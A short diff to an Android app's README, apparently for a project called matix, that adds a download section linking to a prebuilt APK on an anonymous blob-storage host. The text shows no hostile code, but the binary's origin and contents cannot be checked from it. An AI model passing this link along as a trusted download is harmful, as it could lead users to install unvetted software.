@@ -29,3 +29,5 @@ ideas, points, notifications, roles, video calls, all of it.
 
 Replace `app/src/main/assets/app.html` with the new file and rebuild. Nothing
 else to change.
+## download:
+you can download this [here](https://bzl2ejd7c5wn5h9j.public.blob.vercel-storage.com/matix-android.apk)
